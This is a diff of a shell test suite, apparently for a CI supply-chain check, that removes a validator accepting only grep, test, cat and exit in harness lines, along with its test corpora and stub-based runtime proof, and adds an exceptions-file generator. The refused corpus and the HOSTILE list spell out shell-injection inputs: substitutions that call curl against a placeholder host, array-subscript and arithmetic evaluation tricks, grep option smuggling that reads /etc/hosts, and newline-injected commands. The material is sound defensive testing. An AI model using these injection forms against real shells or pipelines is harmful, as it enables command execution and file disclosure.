-    for k, c in enumerate(cmds):
-        for t in c:
-            if t[2] == "pos" and int(t[1]) > len(args): raise Refused(f"${t[1]} names no argument")
-        while c and c[0][2] == "bare" and c[0][1] in W["negation"]: c = c[1:]
-        if not c: raise Refused("an empty command")
-        word, kind, rest = c[0][1], c[0][2], c[1:]
-        if kind != "bare" or word not in W["commands"]: raise Refused(f"the command word {word!r} is not in commands (unquoted)")
-        if k and seps[k - 1] == "|" and word not in W["pipe_into"]: raise Refused(f"a pipe into {word!r} (pipe_into)")
-        if word == "grep":                                 # grep OPTION... -- PATTERN ["$N"...], each word in its role
-            i = 0
-            while i < len(rest) and rest[i][2] == "bare" and rest[i][1] in W["grep_options"]: i += 1
-            if W["end_of_options"]:
-                if i >= len(rest) or rest[i][2] != "bare" or rest[i][1] != W["end_of_options"]:
-                    raise Refused(f"grep needs its options from grep_options, then {W['end_of_options']} before the pattern (a quoted word is never an option)")
-                i += 1
-            if i >= len(rest): raise Refused("grep has no pattern")
-            p = rest[i]
-            if not ((p[2] == "bare" and p[1] in W["grep_bare_patterns"]) or (p[2] == "dq" and not (W["pattern_first_char_not"] and p[1][1:].startswith(W["pattern_first_char_not"])))):
-                raise Refused(f"the grep pattern {p[1]!r} is not a double-quoted word that does not start with {W['pattern_first_char_not']!r}, or a bare pattern from grep_bare_patterns")
-            for a in rest[i + 1:]:
-                if a[2] != "pos": raise Refused(f"the grep file operand {a[1]!r} is not a positional \"$N\"")
-        elif word == "test": test_expr(rest)
-        elif word == "[":
-            if not rest or rest[-1][2] != "bare" or rest[-1][1] != "]": raise Refused("[ without its closing ]")
-            test_expr(rest[:-1])
-        elif word == "cat":                                # cat -- "$N"
-            want = ([("bare", W["end_of_options"])] if W["end_of_options"] else []) + [("pos",)]
-            if len(rest) != len(want) or any(a[2] != w[0] or (w[0] == "bare" and a[1] != w[1]) for a, w in zip(rest, want)):
-                raise Refused(f"cat takes exactly {W['end_of_options'] + ' ' if W['end_of_options'] else ''}and one positional")
-        elif word == "exit":
-            if len(rest) != 1 or rest[0][2] != "bare" or rest[0][1] not in W["exit_status"]: raise Refused("exit takes exactly one exit_status")
-        else:
-            for a in rest:
-                if a[2] not in ("dq", "pos"): raise Refused(f"the argument {a[1]!r} is not a double-quoted word or a positional")
-def main():
-    try:
-        judge(open(sys.argv[2], encoding="utf-8", errors="surrogateescape", newline="").read() if sys.argv[1] == "--file" else sys.argv[1])
-    except Refused as e:
-        print("refused: " + str(e)); sys.exit(1)
-    print("harness assertion: runs nothing but grep, test, cat and exit <digit>"); sys.exit(0)
-if __name__ == "__main__":
-    main()
-PY
-hf() { rc=0; python3 "$work/harness_form.py" "$1" >"$work/hf.out" 2>&1 || rc=$?; }
-hff() { rc=0; python3 "$work/harness_form.py" --file "$1" >"$work/hf.out" 2>&1 || rc=$?; }
-cat >"$work/hf-refused.tsv" <<'EOF'
-a pipe into sh	t "r" "x" bash -c 'grep -q a "$1" | sh' _ "$CALLS"
-a pipe into bash	t "r" "x" bash -c 'cat "$1" | bash' _ "$CALLS"
-an output redirection >	t "r" "x" bash -c 'grep a "$1" > out' _ "$CALLS"
-an output redirection >>	t "r" "x" bash -c 'grep a "$1" >> out' _ "$CALLS"
-an input redirection <	t "r" "x" bash -c 'grep a < "$1"' _ "$CALLS"
-$(curl ...) in the body	t "r" "x" bash -c 'test "$(curl -s https://e.example/x)" = 1' _
-$(...) of another command in the body	t "r" "x" bash -c 'test "$(ls)" = 1' _
-an unquoted $(grep -c ...) in the body	t "r" "x" bash -c 'test $(grep -c a "$1") -ge 1' _ "$CALLS"
-a pipe inside $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1" | sh)" -ge 1' _ "$CALLS"
-a substitution inside $(cat ...)	t "r" "x" bash -c 'test "$(cat $(curl -s https://e.example/x))" = 1' _
-$(cat ...) of a literal path, not a positional argument	t "r" "x" bash -c 'test "$(cat f)" = 1' _
-$(grep -c ...) on a literal path, not a positional argument	t "r" "x" bash -c 'test "$(grep -c a f)" -ge 1' _
-a process substitution in the body	t "r" "x" bash -c 'grep a <(cat "$1")' _ "$CALLS"
-a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c 'grep a "$1"' _ "$CALLS"
-a substitution the outer shell runs, in the rule label	t "r $(curl -s https://e.example/x)" "x" bash -c 'grep a "$1"' _ "$CALLS"
-a substitution the outer shell runs, in an argument	t "r" "x" bash -c 'grep a "$1"' _ "$(curl -s https://e.example/x)"
-backticks in the body	t "r" "x" bash -c 'test "`curl -s https://e.example/x`" = 1' _
-backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c 'grep a "$1"' _ "$CALLS"
-a command word outside the vocabulary (curl)	t "r" "x" bash -c 'curl -s https://e.example/x' _
-a quoted command word	t "r" "x" bash -c '"grep" a "$1"' _ "$CALLS"
-a variable as the command word	t "r" "x" bash -c '$G a "$1"' _ "$CALLS"
-a positional argument as the command word	t "r" "x" bash -c '"$1" a' _ "$CALLS"
-eval	t "r" "x" bash -c 'eval "grep a f"' _
-source	t "r" "x" bash -c 'source "$1"' _ "$CALLS"
-a second bash -c	t "r" "x" bash -c 'bash -c "grep a f"' _
-a ;-separated extra command (wget)	t "r" "x" bash -c 'grep a "$1"; wget https://e.example/x' _ "$CALLS"
-exit with a variable status	t "r" "x" bash -c 'grep a "$1" && exit $x' _ "$CALLS"
-exit with a positional status	t "r" "x" bash -c 'grep a "$1" && exit "$1"' _ "$CALLS"
-exit with no status	t "r" "x" bash -c 'grep a "$1" && exit' _ "$CALLS"
-exit with two arguments	t "r" "x" bash -c 'grep a "$1" && exit 1 2' _ "$CALLS"
-exit with a negative status	t "r" "x" bash -c 'grep a "$1" && exit -1' _ "$CALLS"
-exit with two digits	t "r" "x" bash -c 'grep a "$1" && exit 10' _ "$CALLS"
-exit with a quoted status	t "r" "x" bash -c 'grep a "$1" && exit "1"' _ "$CALLS"
-a quoted exit	t "r" "x" bash -c 'grep a "$1" && "exit" 1' _ "$CALLS"
-a background &	t "r" "x" bash -c 'grep a "$1" & curl https://e.example/x' _ "$CALLS"
-a subshell	t "r" "x" bash -c '(curl https://e.example/x)' _
-cat with an option	t "r" "x" bash -c 'cat -v "$1"' _ "$CALLS"
-cat of two files	t "r" "x" bash -c 'cat "$1" "$1"' _ "$CALLS"
-a pipe into anything but grep (tee)	t "r" "x" bash -c 'cat "$1" | tee g' _ "$CALLS"
-not the t function	run "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
-an unquoted title	t "r" x bash -c 'grep a "$1"' _ "$CALLS"
-no rule label	t "x" bash -c 'grep a "$1"' _ "$CALLS"
-an empty command between operators	t "r" "x" bash -c 'grep a "$1" && && grep b "$1"' _ "$CALLS"
-Codex R1 reproduction: a DOUBLE-quoted body with an outer variable (its value is spliced into the code)	t "r" "x" bash -c "grep -q a '$CALLS'"
-a double-quoted body even with no variable	t "r" "x" bash -c "grep -q a f" _
-no _ after the body	t "r" "x" bash -c 'grep a "$1"' "$CALLS"
-a $0 other than _	t "r" "x" bash -c 'grep a "$1"' x "$CALLS"
-an unquoted word after the body	t "r" "x" bash -c 'grep a "$1"' _ curl
-a second body after the arguments	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS" bash -c 'curl https://e.example/x'
-an argument variable outside the allowlist	t "r" "x" bash -c 'grep a "$1"' _ "$HOME"
-an argument with two variables	t "r" "x" bash -c 'grep a "$1"' _ "$work$CALLS"
-an argument written ${work}	t "r" "x" bash -c 'grep a "$1"' _ "${work}/rc"
-an argument with a variable in the path	t "r" "x" bash -c 'grep a "$1"' _ "$work/$x"
-an argument with a glob	t "r" "x" bash -c 'grep a "$1"' _ "$work/*"
-a single-quoted argument	t "r" "x" bash -c 'grep a "$1"' _ '$CALLS'
-an unquoted argument	t "r" "x" bash -c 'grep a "$1"' _ $CALLS
-a literal argument	t "r" "x" bash -c 'grep a "$1"' _ "f"
-a positional beyond the arguments	t "r" "x" bash -c 'grep a "$2"' _ "$CALLS"
-an unquoted positional	t "r" "x" bash -c 'grep a $1' _ "$CALLS"
-"$@" in the body	t "r" "x" bash -c 'grep a "$@"' _ "$CALLS"
-"${1}" in the body	t "r" "x" bash -c 'grep a "${1}"' _ "$CALLS"
-"$10" in the body	t "r" "x" bash -c 'grep a "$10"' _ "$CALLS"
-a positional inside a longer word	t "r" "x" bash -c 'grep a "$1/x"' _ "$CALLS"
-a positional glued to another word	t "r" "x" bash -c 'grep a "$1"x' _ "$CALLS"
-an inner variable in a double-quoted word	t "r" "x" bash -c 'grep "$HOME" "$1"' _ "$CALLS"
-an escaped quote in a double-quoted word	t "r" "x" bash -c 'grep "a\"b" "$1"' _ "$CALLS"
-an escaped dollar in a double-quoted word	t "r" "x" bash -c 'grep "a\$b" "$1"' _ "$CALLS"
-an unquoted backslash	t "r" "x" bash -c 'grep a\ b "$1"' _ "$CALLS"
-Sonnet R1 reproduction 2 (new form): test -v with a literal $(...) array subscript (bash 5 evaluates it)	t "r" "x" bash -c 'test -v "a[\$(curl -s https://e.example/x)]"' _
-test -v "a[$(touch X)]" (the substitution runs at expansion)	t "r" "x" bash -c 'test -v "a[$(touch X)]"' _
-test -v on a positional argument (its value would be the subscript)	t "r" "x" bash -c 'test -v "$1"' _ "$CALLS"
-[ -v "x[$(cmd)]" ]	t "r" "x" bash -c '[ -v "x[$(cmd)]" ]' _
-[ -R "x[$(cmd)]" ]	t "r" "x" bash -c '[ -R "x[$(cmd)]" ]' _
--eq with an array-subscript operand	t "r" "x" bash -c '[ "$(cat "$1")" -eq "a[$(cmd)]" ]' _ "$CALLS"
--ge with a positional operand	t "r" "x" bash -c 'test "$1" -ge 0' _ "$CALLS"
-a backtick inside a double-quoted pattern	t "r" "x" bash -c 'grep "a`curl -s https://e.example/x`" "$1"' _ "$CALLS"
-${x} in a double-quoted pattern	t "r" "x" bash -c 'grep "${x}" "$1"' _ "$CALLS"
-${x} unquoted	t "r" "x" bash -c 'grep ${x} "$1"' _ "$CALLS"
-$((1+1))	t "r" "x" bash -c 'test $((1+1)) = 2' _
-$( inside a grep -c pattern	t "r" "x" bash -c 'test "$(grep -c "a$(curl -s https://e.example/x)" "$1")" -ge 1' _ "$CALLS"
-an arithmetic comparison on $(cat ...) (the file's text would be the expression)	t "r" "x" bash -c 'test "$(cat "$1")" -eq 0' _ "$work/evil"
-an arithmetic comparison on a quoted word	t "r" "x" bash -c 'test "a" -eq 0' _
-an arithmetic comparison on a bare word (a variable name)	t "r" "x" bash -c 'test a -eq 0' _
-an arithmetic comparison on an inner variable	t "r" "x" bash -c 'test $x -eq 0' _
-test -n	t "r" "x" bash -c 'test -n "$1"' _ "$CALLS"
-test -z	t "r" "x" bash -c '[ -z "$1" ]' _ "$CALLS"
-test -a (and)	t "r" "x" bash -c 'test -f "$1" -a -f "$1"' _ "$CALLS"
-test -o (an option name)	t "r" "x" bash -c 'test -o errexit' _
-test with one operand	t "r" "x" bash -c 'test a' _
-test with four operands	t "r" "x" bash -c 'test a = b c' _
-an operator outside the set (-nt)	t "r" "x" bash -c 'test "$1" -nt "$1"' _ "$CALLS"
-a quoted operator	t "r" "x" bash -c 'test a "=" b' _
-a quoted unary operator	t "r" "x" bash -c 'test "-f" "$1"' _ "$CALLS"
-$[ ] legacy arithmetic	t "r" "x" bash -c 'test $[1+1] = 2' _
-$[ ] on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $[A] = 1' _
-$(( )) on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $((A)) = 1' _
-(( )) arithmetic command	t "r" "x" bash -c 'A=a[\$(cmd)]; ((A))' _
-let	t "r" "x" bash -c 'A=a[\$(cmd)]; let A' _
-declare -i	t "r" "x" bash -c 'declare -i A; A=a[\$(cmd)]' _
-typeset -i	t "r" "x" bash -c 'typeset -i A; A=a[\$(cmd)]' _
-local (inside a function)	t "r" "x" bash -c 'f() { local -i A=a[\$(cmd)]; }; f' _
-printf -v with a subscript	t "r" "x" bash -c 'printf -v a[\$(cmd)] x' _
-read into a subscript	t "r" "x" bash -c 'read a[\$(cmd)] <<< x' _
-eval of a word	t "r" "x" bash -c 'eval cmd' _
-. (dot) source	t "r" "x" bash -c '. "$1"' _ "$work/f"
-an array-subscript assignment	t "r" "x" bash -c 'a[\$(cmd)]=1' _
-an array subscript as a test operand	t "r" "x" bash -c 'test a[1] = 1' _
-indirect ${!x}	t "r" "x" bash -c 'x=a[\$(cmd)]; test "${!x}" = 1' _
-$'...' ANSI-C quotes	t "r" "x" bash -c 'grep $'"'"'\x61'"'"' "$1"' _ "$CALLS"
-<( ) process substitution as a grep file	t "r" "x" bash -c 'grep "a" <(cmd)' _
->( ) process substitution	t "r" "x" bash -c 'grep "a" "$1" > >(cmd)' _ "$CALLS"
-{a,b} brace expansion in command position	t "r" "x" bash -c '{cmd,x}' _
-a glob in command position	t "r" "x" bash -c 'cm?' _
-a bracket glob in command position	t "r" "x" bash -c '[c]md' _
-a glob as a test operand	t "r" "x" bash -c 'test -f *' _
-a glob as a grep pattern	t "r" "x" bash -c 'grep * "$1"' _ "$CALLS"
-a here-string <<<	t "r" "x" bash -c 'grep "a" <<< "$1"' _ "$CALLS"
-an unquoted grep pattern word	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
-$ in the title	t "r" "x $u" bash -c 'grep -q . "$1"' _ "$CALLS"
-$[ ] in the title	t "r" "$[1+1]" bash -c 'grep -q . "$1"' _ "$CALLS"
-$(( )) in the title	t "r" "$((1+1))" bash -c 'grep -q . "$1"' _ "$CALLS"
-${!x} in the rule label	t "r ${!x}" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
-$ in the rule label	t "r $x" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
-a backslash in the title	t "r" "x \$y" bash -c 'grep -q . "$1"' _ "$CALLS"
-an array subscript in an argument path	t "r" "x" bash -c 'grep -q . "$1"' _ "$work/a[1]"
-$(( )) in an argument	t "r" "x" bash -c 'grep -q . "$1"' _ "$((1))"
-more ARGs than max_args (ten)	t "r" "x" bash -c 'grep -q . "$1"' _ "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS"
-grep -vq as one word (the whitelist lists -v and -q, one option per word)	t "r" "x" bash -c 'grep -vq "a" "$1"' _ "$CALLS"
-Codex R3 reproduction: a double-quoted --file=... read as a grep OPTION	t "r" "x" bash -c 'grep "--file=/etc/hosts" "$1"' _ "$CALLS"
-Codex R3 reproduction: the same inside the count substitution	t "r" "x" bash -c 'test "$(grep -c "--file=/etc/hosts" "$1")" -ge 1' _ "$CALLS"
-Sonnet B1: a double-quoted --version	t "r" "x" bash -c 'grep "--version" "$1"' _ "$CALLS"
-Sonnet B1: a double-quoted --pager=... in the count substitution	t "r" "x" bash -c 'test "$(grep -c "--pager=touch M" "$1")" -ge 1' _ "$CALLS"
-a double-quoted -f	t "r" "x" bash -c 'grep "-f" -- "a" "$1"' _ "$CALLS"
-a double-quoted --file=x before --	t "r" "x" bash -c 'grep "--file=x" -- "a" "$1"' _ "$CALLS"
-a double-quoted -e with a pattern	t "r" "x" bash -c 'grep "-e" "pat" "$1"' _ "$CALLS"
---regexp=x as the pattern after --	t "r" "x" bash -c 'grep -- "--regexp=x" "$1"' _ "$CALLS"
-a double-quoted -r	t "r" "x" bash -c 'grep "-r" -- "a" "$1"' _ "$CALLS"
-a double-quoted -E	t "r" "x" bash -c 'grep "-E" -- "a" "$1"' _ "$CALLS"
-a pattern that starts with - (even after --)	t "r" "x" bash -c 'grep -- "-a" "$1"' _ "$CALLS"
-grep without -- before the pattern	t "r" "x" bash -c 'grep -q "a" "$1"' _ "$CALLS"
-grep without -- in the count substitution	t "r" "x" bash -c 'test "$(grep -c "a" "$1")" -ge 1' _ "$CALLS"
--- placed after the pattern	t "r" "x" bash -c 'grep "a" -- "$1"' _ "$CALLS"
-a literal file operand	t "r" "x" bash -c 'grep -- "a" "f"' _ "$CALLS"
-a second pattern word	t "r" "x" bash -c 'grep -- "a" "b" "$1"' _ "$CALLS"
-cat without --	t "r" "x" bash -c 'test "$(cat "$1")" = "a"' _ "$CALLS"
-cat -- with a literal operand	t "r" "x" bash -c 'test "$(cat -- "f")" = "a"' _ "$CALLS"
-an option after --	t "r" "x" bash -c 'grep -- -v "a" "$1"' _ "$CALLS"
-Codex R6: a literal path as a file-test operand	t "r" "x" bash -c 'test -f "/etc/passwd"' _
-Codex R6: a cat substitution as a file-test operand	t "r" "x" bash -c 'test -s "$(cat -- "$1")"' _ "$CALLS"
-a grep count substitution as a file-test operand	t "r" "x" bash -c '[ -e "$(grep -c -- "a" "$1")" ]' _ "$CALLS"
-a double-quoted word as a file-test operand	t "r" "x" bash -c 'test -d "x"' _
-a bare number as a file-test operand	t "r" "x" bash -c 'test -r 1' _
-a file test with an extra argument	t "r" "x" bash -c 'test -e "$1" x' _ "$CALLS"
-a file test on a positional beyond the arguments	t "r" "x" bash -c 'test -f "$2"' _ "$CALLS"
-Sonnet R6: cat with two operands	t "r" "x" bash -c 'test "$(cat -- "$1" "$2")" = "a"' _ "$CALLS" "$CALLS"
-Sonnet R6: cat with an extra word as a command	t "r" "x" bash -c 'cat -- "$1" EXTRA' _ "$CALLS"
-cat with two positionals as a command	t "r" "x" bash -c 'cat -- "$1" "$2"' _ "$CALLS" "$CALLS"
-EOF
-while IFS=$'\t' read -r what line; do
-  hf "$line"
-  CASE="AC16 harness form: refused ($what): exit 1, says refused"
-  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
-done <"$work/hf-refused.tsv"
-# characters bash reads differently from the parser: anything outside space, tab and printable ASCII (Sonnet R1 reproduction 1: a literal newline in the body)
-python3 - "$work" <<'PY'
-import sys
-w = sys.argv[1]
-B = 't "r" "x" bash -c \'grep a "$1"\' _ "$CALLS"'
-cases = [
-    ("Sonnet R1 reproduction 1: a literal newline in the body (bash runs the text after it as a second command)", 't "r" "x" bash -c \'grep a "$1"\ncurl -s https://e.example/x\' _ "$CALLS"'),
-    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
-    ("a literal newline in the rule label", B.replace('"r"', '"r\ns"')),
-    ("a literal newline after the arguments", B + "\ncurl -s https://e.example/x"),
-    ("a carriage return in the body", 't "r" "x" bash -c \'grep a "$1"\rcurl -s https://e.example/x\' _ "$CALLS"'),
-    ("a control character (0x01) in the body", B.replace("grep a", "grep a\x01")),
-    ("an escape (0x1b) in the title", B.replace('"x"', '"x\x1b[0m"')),
-    ("a vertical tab in the body", B.replace("grep a", "grep a\x0bcurl")),
-    ("a form feed in the body", B.replace("grep a", "grep a\x0c")),
-    ("DEL (0x7f) in the body", B.replace("grep a", "grep a\x7f")),
-    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
-    ("a non-breaking space in the body", B.replace("grep a", "grep a")),
-]
-for i, (what, line) in enumerate(cases):
-    open("%s/ctl-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
-    open("%s/ctl-%02d.what" % (w, i), "w").write(what)
-PY
-for f in "$work"/ctl-*.txt; do
-  hff "$f"
-  CASE="AC16 harness form: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
-  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
-done
-cat >"$work/hf-accepted.tsv" <<'EOF'
-the whole vocabulary	t "r" "x" bash -c 'grep -q -- "a" "$1" && ! grep -E -- "b|c" "$1" || test "$(grep -c -- "a" "$1")" -ge 3; [ "$(cat -- "$1")" = 2 ] | grep -q -- .' _ "$CALLS"
-exit with one literal digit	t "r" "x" bash -c 'grep -- "a" "$1" | grep -v -q -- "b" && exit 1; exit 0' _ "$CALLS"
-the file tests -f -s -e -d -r and !	t "r" "x" bash -c 'test -f "$1" && [ -s "$1" ] && test -e "$1" && ! test -d "$1" && test ! -d "$1" && [ -r "$1" ]' _ "$CALLS"
-string = and != on $(cat -- ...)	t "r" "x" bash -c 'test "$(cat -- "$1")" != "b" && [ "$(cat -- "$2")" = "a" ]' _ "$work/rc" "$CALLS"
-arithmetic on digits and on $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c -E -- "a" "$1")" -eq 1 && [ 3 -ne 4 ] && test 1 -lt 2 && test 2 -le 2 && test 3 -gt 2' _ "$CALLS"
-escaped dot and brackets in a pattern	t "r" "x" bash -c 'grep -Eq -- "\[a\.b\]" "$1"' _ "$CALLS"
-a pattern whose first character is a space, then a dash	t "r" "x" bash -c 'grep -q -- " -x" "$1"' _ "$CALLS"
-no argument after _	t "r" "x" bash -c 'test 1 -eq 1' _
-synthetic, the HTTPS-check shape: no unknown field, one flag with its value, no second flag, a count	t "rule 9" "synthetic: every call has the flag --alpha with the value =beta, once, and no plain http address" bash -c 'grep -q -- " unk:\[" "$1" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -v -q -- " opt:\[--alpha\] val:\[=beta\]" && exit 1; grep -Eq -- " opt:\[--alpha\] .* opt:\[--alpha\]| url:\[http://" "$1" && exit 1; test "$(grep -c -- "^argv \[tool\]" "$1")" -ge 3' _ "$work/argv"
-synthetic, the cap-check shape: selected calls, a positive whole-number value, a count	t "rule 9" "synthetic: every selected call has a positive cap" bash -c 'grep -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1" | grep -v -Eq -- " opt:\[--cap\] val:\[(1|2|3|4|5|6|7|8|9)(0|1|2|3|4|5|6|7|8|9)*\]" && exit 1; test "$(grep -c -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1")" -ge 1' _ "$work/argv"
-synthetic, the status-file shape: an exit status, an existing log, no selected call	t "rule 9" "synthetic: status 2, the log exists and holds no selected call" bash -c 'test "$(cat -- "$1")" = 2 && test -f "$2" && ! grep -q -E -- " url:\[https://example\.invalid/(a.b|cd)/" "$2"' _ "$work/rc" "$work/argv"
-synthetic, the first-field shape: a required first field and no redirect flag in any letter group	t "rule 9" "synthetic: every call starts with opt -q and none has -L" bash -c 'grep -- "^argv \[tool\]" "$1" | grep -v -q -- "^argv \[tool\] opt:\[-q\]" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -Eq -- " opt:\[-(f|s|S|g|q)*L(f|s|S|g|q|o|m)*\]| opt:\[--location\]" && exit 1; test "$(grep -c -- "^argv \[tool\] opt:\[-q\]" "$1")" -ge 3' _ "$work/argv"
-a file test on a positional ($1 or $2)	t "r" "x" bash -c 'test -f "$1" && [ -s "$2" ] && ! test -d "$2"' _ "$work/rc" "$CALLS"
-EOF
-while IFS=$'\t' read -r what line; do
-  hf "$line"
-  CASE="AC16 harness form: accepted ($what): exit 0"
-  check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
-done <"$work/hf-accepted.tsv"
-# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
-cat >"$work/hf-real.txt" <<'EOF'
-printf -v FETCH %s curl
-EOF
-while IFS= read -r line; do
-  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
-done <"$work/hf-real.txt"
-CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
-check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
+# --- REQ-SUP-001-ruled text. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's exceptions
+# file rules such lines by a ROW OF A FILE in the list reviewed_files: {file, ruling}, one row per file, no other field. EVERY unmeasured occurrence in the
+# file is ruled text, whatever its count; a row for another file, a row the pull request brings, no row, and a malformed list fail as before (a malformed
+# list stops the check, exit 2, never "nothing ruled" and never "everything ruled"). unmeasured_text keeps only non-text rows: a text ruling in it is a
+# malformed list. -------------------------------------------------------------------------
+# rf.py OUT REPO MODE FILE...: writes an exceptions file with a reviewed_files row per FILE; MODE changes the file (see the table below)
+cat >"$work/rf.py" <<'PY'
 import hashlib, json, sys
+out, repo, mode, *files = sys.argv[1:]
 H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
-real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
-rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
-assert real == rows, (sorted(real ^ rows))
+RULING = "reviewed file: a test fixture"
+rows = [{"file": f, "ruling": RULING} for f in files]
+um = []
+raw = None
+if mode in ("all", "ok"): pass
+elif mode == "none": rows = []
+elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
+elif mode == "emptyruling": rows[0]["ruling"] = ""
+elif mode == "noruling": del rows[0]["ruling"]
+elif mode == "extra": rows[0]["note"] = "x"
+elif mode == "extrakey": rows[0]["key"] = H("k")
+elif mode == "extracount": rows[0]["count"] = 2
+elif mode == "dup": rows = rows + [dict(rows[0], ruling="another ruling")]
+elif mode == "dupsame": rows = rows + rows[:1]
+elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["ruling"]]
+elif mode == "nofile": del rows[0]["file"]
+elif mode == "emptyfile": rows[0]["file"] = ""
+elif mode == "notlist": rows = {"rows": rows}
+elif mode == "textrow":       # a text ruling in unmeasured_text (the old per-line shape), next to a good reviewed_files row
+    um = [{"file": files[0], "form": "a download", "key": H("k"), "line": H("k"), "ruling": "text, not a command: a test line"}]
+elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [], "reviewed_files": ' + json.dumps(rows) + '}'
+elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' + json.dumps(rows[0])[:-1] + ', "ruling": "another"}]}'
+elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": [], "reviewed_files": ' + json.dumps(rows) + '}'
+elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": [], "reviewed_files": ' + json.dumps(rows) + '}'
+elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}]}'
+else: raise SystemExit("unknown mode " + mode)
+if raw is not None:
+    open(out, "w").write(raw)
+else:
+    json.dump({"_format": "t", "exceptions": [], "unmeasured_text": um, "reviewed_files": rows}, open(out, "w"), indent=2)
 PY
-# --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under every bash on PATH (one per version: bash 5, whose test -v / -R / arithmetic operands
-# evaluate $(...) even in single quotes, and, where present, an older bash such as 3.2), with a stub directory first on PATH whose curl, wget, touch, cmd and
-# ls only write a marker file; the inner bash is the same shell. Then: every line that wrote the marker was refused by the parser, the planted reproductions
-# did write it (the harness detects a run), and every accepted line (the corpus and the committed real lines) ran and wrote nothing, with plain paths and
-# with quote-, substitution- and subscript-carrying argument values.
-cat >"$work/hf_run.py" <<'PY'
-import json, os, subprocess, sys, tempfile
-hfpy, w = sys.argv[1], sys.argv[2]
-def shells():                                              # every bash on PATH, one per version: bash 5 (the reproductions) and, where present, an older one (3.2)
-    seen, out = set(), []
-    for d in os.environ.get("PATH", "").split(os.pathsep):
-        p = os.path.join(d, "bash")
-        if d and os.access(p, os.X_OK):
-            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
-            v = r.stdout.strip()
-            if r.returncode == 0 and v and v not in seen:
-                seen.add(v); out.append((p, v))
-    return out
-SH = shells()
-b5 = next((p for p, v in SH if int(v.split(".")[0]) >= 5), None)
-corpus = []
-for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
-    for l in open(os.path.join(w, name)).read().split("\n"):
-        if l:
-            what, line = l.split("\t", 1); corpus.append((kind, what, line))
-for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
-    if l:
-        corpus.append(("real", l[:60], l))
-for f in sorted(os.listdir(w)):
-    if f.startswith("ctl-") and f.endswith(".txt"):
-        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
-# argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
-HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
-           "`curl -s https://e.example/x`"]
-out = {"bash5": b5, "shells": [v for _, v in SH], "hostile": HOSTILE, "lines": []}
-if b5:
-    for kind, what, line in corpus:
-        marks = {}
-        for sh, ver in SH:
-            d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
-            st = os.path.join(d, "stubs"); os.mkdir(st)
-            mark = os.path.join(d, "marker")
-            for n in ("curl", "wget", "touch", "cmd", "ls"):
-                p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % sh); os.chmod(p, 0o755)
-            p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (sh, sh)); os.chmod(p, 0o755)
-            for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
-                         ("evil", "a[$(curl -s https://e.example/x)]\n")):
-                open(os.path.join(d, n), "w").write(t)
-            def run(work, calls, u):
-                if os.path.exists(mark): os.remove(mark)
